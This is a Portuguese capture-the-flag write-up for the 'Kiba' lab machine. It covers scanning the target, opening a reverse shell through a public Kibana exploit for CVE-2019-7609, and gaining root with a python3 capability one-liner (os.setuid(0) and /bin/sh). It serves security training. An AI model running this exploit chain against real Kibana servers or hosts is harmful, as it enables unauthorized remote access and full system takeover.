# Kiba

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.0.81
```
![image](https://github.com/lufffe/Writeups/assets/90646635/faf56563-dd08-4802-8e81-ac2e3b52315f)

![image](https://github.com/lufffe/Writeups/assets/90646635/53c0174f-da66-48aa-979b-0d43b8d7bdad)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,80,5044,5601 10.10.0.81
```
![image](https://github.com/lufffe/Writeups/assets/90646635/402636d0-e7bb-4d61-8ddf-5a84c01d75ac)

* ### Verificando o que roda na porta 5601
![image](https://github.com/lufffe/Writeups/assets/90646635/64849b76-3d7b-4138-b1af-c92d4edf81c7)

* ### Procurando um exploit para o Kibana.
https://github.com/LandGrey/CVE-2019-7609

```bash
git clone <https://github.com/LandGrey/CVE-2019-7609.git
```

```bash
python CVE-2019-7609-kibana-rce.py
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6a686632-a740-41f8-9c38-0e54dfd637af)

* ### Pegando uma reverse shell pelo Kibana.
```bash
python2.7 CVE-2019-7609-kibana-rce.py -u http://10.10.0.81:5601/ -host IP -port 4455 --shell
```
![image](https://github.com/lufffe/Writeups/assets/90646635/7ee14eb2-938b-41c8-b0b9-753c90c10c3c)

![image](https://github.com/lufffe/Writeups/assets/90646635/de86f28c-000c-43b9-acce-92466073cd29)

![image](https://github.com/lufffe/Writeups/assets/90646635/7f9a0979-003c-4ace-a803-6f6187d7aa8a)

* ### Flag User.
```bash
kiba@ubuntu:/home/kiba$ cat user.txt
```


```bash
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6d17ac7a-ce2d-49e6-ba5a-2c97bac35b26)

* ### GtFobins.
![image](https://github.com/lufffe/Writeups/assets/90646635/a9bf60f5-d3b8-4413-95f6-8e55f00ef0bf)

```bash
kiba@ubuntu:/home/kiba$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
![image](https://github.com/lufffe/Writeups/assets/90646635/00ff7334-fbb6-4a8d-95b5-d7ea042e2e92)

* ### Flag Root.
```bash
cat /root/root.txt
```
